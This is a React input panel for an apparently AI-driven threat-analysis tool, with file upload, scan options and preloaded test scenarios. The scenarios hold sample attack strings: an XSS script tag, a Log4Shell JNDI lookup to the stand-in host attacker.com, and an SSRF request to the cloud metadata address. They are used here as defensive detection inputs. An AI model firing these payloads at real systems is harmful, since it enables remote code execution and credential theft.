import { useState, useRef } from 'react';

const INPUT_TYPES = [
  { key: 'log', label: 'LOG', desc: 'Analyze server & application logs' },
  { key: 'network', label: 'PACKET', desc: 'Deep heuristic scan on network traffic' },
  { key: 'sql', label: 'SQL', desc: 'Detect injection vectors in queries' },
  { key: 'text', label: 'TEXT', desc: 'Raw text anomaly detection' },
  { key: 'file', label: 'FILE', desc: 'Upload direct forensics artifact' },
];

const TEST_SCENARIOS = [
  {
    id: 'xss-waf',
    name: 'Malicious Link Click',
    type: 'log',
    content: `<134>Mar 24 07:30:01 TWIN ASM: uri="/search?q=<script>alert(document.domain)</script>" request_status="passed" violation_rating="5" staged_sig_names="XSS script tag (URI)" method="GET" response_code="200" ip_client="193.17.57.100"`
  },
  {
    id: 'log4shell',
    name: 'Server Exploit',
    type: 'log',
    content: `2026-03-24 10:15:22 ERROR [App] User-Agent: \${jndi:ldap://attacker.com/Exploit}\nException in thread "main" java.lang.NullPointerException`
  },
  {
    id: 'network-scan',
    name: 'Network Attack',
    type: 'network',
    content: `10.0.0.5 -> 192.168.1.100 TCP SYN\n10.0.0.5 -> 192.168.1.100 TCP SYN\n10.0.0.5 -> 192.168.1.100 TCP SYN\n10.0.0.5 -> 192.168.1.100 TCP SYN`
  },
  {
    id: 'ssrf',
    name: 'Internal Access',
    type: 'log',
    content: `GET /webhook?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: api.internal.corp`
  },
  {
    id: 'bruteforce',
    name: 'Password Guessing',
    type: 'log',
    content: `Failed password for root from 192.168.1.100 port 22\nFailed password for root from 192.168.1.100 port 22\nFailed password for root from 192.168.1.100 port 22`
  }
];

export default function InputPanel({ onAnalyze, isLoading }) {
  const [inputType, setInputType] = useState('log');
  const [content, setContent] = useState('');
  const [fileName, setFileName] = useState('');
  const [dragging, setDragging] = useState(false);
  const fileInputRef = useRef(null);

  // Protocol Card Options
  const [options, setOptions] = useState({
    containment: true,
    deepScan: true,
    obfuscation: false,
  });

  const toggleOption = (key) => setOptions(prev => ({ ...prev, [key]: !prev[key] }));

  const handleFileRead = (file) => {
    setFileName(file.name);
    const reader = new FileReader();
    reader.onload = (e) => {
      const base64Data = e.target.result.split(',')[1] || e.target.result;
      setContent(base64Data);
    };
    reader.readAsDataURL(file);
  };

  const handleDrop = (e) => {
    e.preventDefault();
    setDragging(false);
    const file = e.dataTransfer.files[0];
    if (file) handleFileRead(file);
  };

  const handleSubmit = () => {
    if (!content.trim()) return;
    onAnalyze({
      input_type: inputType,
      content: content,
      file_name: fileName,
      options: {
        mask: options.obfuscation,
        block_high_risk: options.containment,
        log_analysis: options.deepScan,
      }
    });
  };

  const loadScenario = (scenario) => {
    setContent(scenario.content);
    setInputType(scenario.type);
    setFileName('');
  };

  const placeholders = {
    log: 'Paste system or application logs here (supports F5 ASM, Syslog, Apache, etc)...',
    network: 'Paste raw packets, PCAP ASCII dumps, or tcpdump output...',
    text: 'Enter text to scan for credentials and anomalies...',
    file: 'File content will appear here after upload...',
    sql: 'Enter SQL query to analyze for injection vectors...',
  };

  return (
    <div className="input-panel glass-card">
      <div className="card-title">
        INPUT ANALYSIS
      </div>

      {/* Type Selector */}
      <div className="type-selector">
        {INPUT_TYPES.map((t) => (
          <button
            key={t.key}
            className={`type-btn ${inputType === t.key ? 'active' : ''}`}
            onClick={() => setInputType(t.key)}
            title={t.desc}
          >
            {t.label}
          </button>
        ))}
      </div>

      {/* File Upload Zone */}
      {(inputType === 'file' || inputType === 'log') && (
        <>
          <div
            className={`file-drop-zone ${dragging ? 'dragging' : ''}`}
            onDragOver={(e) => { e.preventDefault(); setDragging(true); }}
            onDragLeave={() => setDragging(false)}
            onDrop={handleDrop}
            onClick={() => fileInputRef.current?.click()}
          >
            <div className="drop-text">Drop a file here or click to upload</div>
          </div>
          <input
            ref={fileInputRef}
            type="file"
            accept=".log,.txt,.pdf,.doc,.docx"
            style={{ display: 'none' }}
            onChange={(e) => {
              const file = e.target.files[0];
              if (file) handleFileRead(file);
            }}
          />
          {fileName && (
            <div className="file-name">
              DATASTREAM: {fileName}
            </div>
          )}
        </>
      )}

      {/* Text Input */}
      <textarea
        className="text-input"
        placeholder={placeholders[inputType]}
        value={content}
        onChange={(e) => setContent(e.target.value)}
      />

      {/* Test Scenarios */}
      <div className="test-scenarios">
        <div style={{ fontSize: '0.65rem', opacity: 0.6, marginBottom: '8px', textTransform: 'uppercase', letterSpacing: '0.1em', fontWeight: 700 }}>Test Scenarios:</div>
        <div className="scenario-grid">
          {TEST_SCENARIOS.map((s) => (
            <button
              key={s.id}
              className="scenario-chip"
              onClick={() => loadScenario(s)}
            >
              {s.name}
            </button>
          ))}
          <button
            className="scenario-chip clear"
            onClick={() => { setContent(''); setFileName(''); }}
          >
            [X] CLEAR
          </button>
        </div>
      </div>

      {/* Protocol Cards */}
      <div className="protocol-grid">
        <div 
          className={`protocol-card ${options.containment ? 'active' : ''}`}
          onClick={() => toggleOption('containment')}
        >
          <div className="protocol-title">
            Auto-Block Threats
            <span className="protocol-badge">ACTIVE</span>
          </div>
          <div className="protocol-desc">Automatically stops attacks that exceed normal risk limits before they reach your system.</div>
        </div>

        <div 
          className={`protocol-card ${options.deepScan ? 'active' : ''}`}
          onClick={() => toggleOption('deepScan')}
        >
          <div className="protocol-title">
            Deep AI Scan
            <span className="protocol-badge">ACTIVE</span>
          </div>
          <div className="protocol-desc">Uses Artificial Intelligence to find hidden attacks and new techniques hackers might use.</div>
        </div>

        <div 
          className={`protocol-card ${options.obfuscation ? 'active' : ''}`}
          onClick={() => toggleOption('obfuscation')}
        >
          <div className="protocol-title">
            Hide Sensitive Data
            <span className="protocol-badge">ACTIVE</span>
          </div>
          <div className="protocol-desc">Removes credit card numbers, passwords, and personal info from the logs to keep them safe.</div>
        </div>
      </div>

      {/* Analyze Button */}
      <button
        className="analyze-btn"
        onClick={handleSubmit}
        disabled={isLoading || !content.trim()}
      >
        {isLoading ? 'ANALYZING...' : 'INITIALIZE SCAN'}
      </button>
    </div>
  );
}
